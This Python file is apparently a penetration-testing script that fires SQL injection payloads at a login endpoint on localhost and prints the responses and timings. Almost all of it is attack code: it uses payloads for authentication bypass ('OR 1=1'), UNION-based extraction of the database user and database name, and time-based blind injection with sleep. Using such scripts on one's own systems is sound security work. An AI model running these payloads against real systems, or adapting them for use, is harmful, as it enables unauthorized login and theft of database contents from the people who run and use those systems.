import requests

# Target URL
TARGET_URL = "http://localhost:8080/Login"

# Common SQL Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1'; --",
    "' UNION SELECT null, null; --",
    "' AND sleep(5); --",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --"
]

# Test SQL Injection with GET method
def test_sql_injection_get(url):
    print("[*] Testing SQL Injection using GET method on:", url)
    for payload in SQL_PAYLOADS:
        params = {
            "email": payload,      # Replace with the actual parameter name (e.g., "email")
            "password": "test",    # Replace with the actual parameter name
            "role": "user"         # Add any other required parameters
        }
        try:
            response = requests.get(url, params=params, timeout=5)
            print(f"[*] Payload: {payload}")
            print(f"Response code: {response.status_code}")
            print("Response preview:")
            print(response.text[:300])  # Print the first 300 characters of the response
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")

# Main
if __name__ == "__main__":
    print("[*] Starting SQL Injection test...")
    test_sql_injection_get(TARGET_URL)
    
    
    SQL_PAYLOADS = [
        "' AND 1=1; --",  # Always true condition
        "' AND 1=2; --",  # Always false condition
        "' OR '1'='1'; --",  # Authentication bypass
        "' UNION SELECT null, null; --",  # Union-based injection
        "' UNION SELECT user(), database(); --",  # Retrieve current user and database
    ]

    def test_sql_injection_logical(url):
        print("[*] Testing SQL Injection with logical conditions...")
        for payload in SQL_PAYLOADS:
            params = {
                "email": payload,
                "password": "test",
                "role": "user"
            }
            try:
                response = requests.get(url, params=params, timeout=5)
                print(f"[*] Payload: {payload}")
                print(f"Response code: {response.status_code}")
                print("Response preview:")
                print(response.text[:300])  # Print the first 300 characters of the response
            except Exception as e:
                print(f"[-] Error with payload {payload}: {e}")

    test_sql_injection_logical(TARGET_URL)
    
    SQL_TIMING_PAYLOADS = [
        "' AND sleep(5); --",  # Introduce a delay if SQL injection works
        "' OR if(1=1, sleep(5), 0); --",  # Conditional delay
    ]

    def test_sql_injection_timing(url):
        print("[*] Testing SQL Injection with timing payloads...")
        for payload in SQL_TIMING_PAYLOADS:
            params = {
                "email": payload,
                "password": "test",
                "role": "user"
            }
            try:
                response = requests.get(url, params=params, timeout=10)  # Use higher timeout
                print(f"[*] Payload: {payload}")
                print(f"Response time: {response.elapsed.total_seconds()} seconds")
            except Exception as e:
                print(f"[-] Error with payload {payload}: {e}")

    test_sql_injection_timing(TARGET_URL)

